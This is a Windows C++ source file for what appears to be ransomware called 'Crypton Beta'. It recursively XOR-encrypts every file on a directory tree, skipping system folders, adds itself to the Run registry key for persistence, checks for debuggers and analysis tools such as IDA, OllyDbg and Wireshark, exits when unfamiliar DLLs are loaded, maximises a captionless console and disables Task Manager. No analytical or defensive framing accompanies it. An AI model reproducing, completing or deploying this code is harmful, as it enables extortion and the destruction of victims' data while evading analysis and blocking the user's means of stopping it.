#include "sergxor.h"
void CenterConsoleWindow()
{
    HWND consoleWindow = GetConsoleWindow();
    RECT consoleRect;
    GetWindowRect(consoleWindow, &consoleRect);

    int consoleWidth = consoleRect.right - consoleRect.left;
    int consoleHeight = consoleRect.bottom - consoleRect.top;

    HWND desktopWindow = GetDesktopWindow();
    RECT desktopRect;
    GetWindowRect(desktopWindow, &desktopRect);

    int desktopWidth = desktopRect.right - desktopRect.left;
    int desktopHeight = desktopRect.bottom - desktopRect.top;

    int consoleLeft = (desktopWidth - consoleWidth) / 2;
    int consoleTop = (desktopHeight - consoleHeight) / 2;

    SetWindowPos(consoleWindow, NULL, consoleLeft, consoleTop, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
}

void ShowSuccessMessageBox()
{
    MessageBox(NULL, TEXT("Encryption/Decryption Successful!"), TEXT("Success"), MB_OK | MB_ICONINFORMATION);
}

bool addToStartup()
{
    HKEY hKey;
    const char* czStartName = "Crypton Beta";
    TCHAR szPathToExe[MAX_PATH];

    GetModuleFileName(NULL, szPathToExe, MAX_PATH);

    if (RegCreateKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey) == ERROR_SUCCESS)
    {
        if (RegSetValueEx(hKey, czStartName, 0, REG_SZ, (BYTE*)szPathToExe, sizeof(TCHAR) * (lstrlen(szPathToExe) + 1)) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}


bool isSafeDLL(const TCHAR* dllName)
{
    const TCHAR* safeDlls[] = {
        _T("kernel32.dll"),
        _T("User32.dll"),
    };

    for (int i = 0; i < sizeof(safeDlls) / sizeof(safeDlls[0]); ++i)
    {
        if (_tcscmp(dllName, safeDlls[i]) == 0)
            return true;
    }

    return false;
}

void checkInjectedDlls()
{
    HANDLE hProcess;
    HMODULE hMods[1024];
    DWORD cbNeeded;
    unsigned int i;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
    if (NULL == hProcess)
        return;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                if (!isSafeDLL(szModName))
                {
                    std::cout << "Unsafe DLL detected: " << szModName;
                    exit(1);
                }
            }
        }
    }

    CloseHandle(hProcess);
}

bool FileExists(const char* fileName)
{
    std::ifstream infile(fileName);
    return infile.good();
}

std::string GetHashedPassword(std::string password)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE pbHash[16];
    DWORD dwHashLen;
    CHAR rgbDigits[] = "0123456789abcdef";
    std::string hashedPassword;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return "";

    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
        return "";

    if (!CryptHashData(hHash, (BYTE*)password.c_str(), password.length(), 0))
        return "";

    dwHashLen = 16;
    if (CryptGetHashParam(hHash, HP_HASHVAL, pbHash, &dwHashLen, 0))
    {
        for (DWORD i = 0; i < dwHashLen; i++)
        {
            hashedPassword.push_back(rgbDigits[pbHash[i] >> 4]);
            hashedPassword.push_back(rgbDigits[pbHash[i] & 0xf]);
        }
    }
    else
    {
        return "";
    }

    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

    return hashedPassword;
}

void HideConsole()
{
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_MAXIMIZE);

    SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~(WS_VSCROLL | WS_HSCROLL | WS_SIZEBOX));

    SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~(WS_CAPTION));
}

bool isDebuggerOrReverseEngineeringToolRunning() {
    const char* tools[] = {
        "ollydbg.exe",  // OllyDbg
        "wireshark.exe", // Wireshark
        "idaq.exe", // IDA Pro Interactive Disassembler
        "idaq64.exe", // IDA Pro Interactive Disassembler
        "ImmunityDebugger.exe", // Immunity Debugger
        "Dumpcap.exe", // Wireshark's dumpcap.exe
        "HookExplorer.exe", // HookExplorer
        "ImportREC.exe", // ImportREC
        "PEBrowseDbg.exe", // PEBrowse Professional Interactive
        "Windbg.exe", // Windbg
        NULL
    };

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            for (int i = 0; tools[i] != NULL; i++) {
                if (_stricmp(entry.szExeFile, tools[i]) == 0) {
                    return true;
                }
            }
        }
    }

    CloseHandle(snapshot);

    return false;
}

bool isDirectoryExcluded(const std::string& directoryPath)
{
    const std::vector<std::string> excludedDirectories = {
      "C:\\Windows",
      "C:\\Program Files",
      "C:\\Users",
      "C:\\ProgramData"
    };




    for (const std::string& excludedDir : excludedDirectories)
    {
        if (_stricmp(directoryPath.c_str(), excludedDir.c_str()) == 0)
        {
            return true;
        }
    }
    return false;
}

void iterateDirectoryAndXOR(const std::string& directoryPath, const std::string& password)
{
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    std::string path = directoryPath + "\\*";

    hFind = FindFirstFile(path.c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::cout << "FindFirstFile failed with error " << GetLastError();
        return;
    }
    else
    {
        do
        {
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0)
                {
                    std::string newPath = directoryPath + "\\" + findFileData.cFileName;
                    if (!isDirectoryExcluded(newPath))
                    {
                        iterateDirectoryAndXOR(newPath, password);
                    }
                }
            }
            else
            {
                std::string filePath = directoryPath + "\\" + findFileData.cFileName;
                sergxor(password, filePath);
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
    }
    FindClose(hFind);
}
void BlockTaskManager()
{
    HWND taskManager = FindWindow(_T("Task Manager"), NULL);
    EnableWindow(taskManager, FALSE);
}

void UnblockTaskManager()
{
    HWND taskManager = FindWindow(_T("Task Manager"), NULL);
    EnableWindow(taskManager, TRUE);
}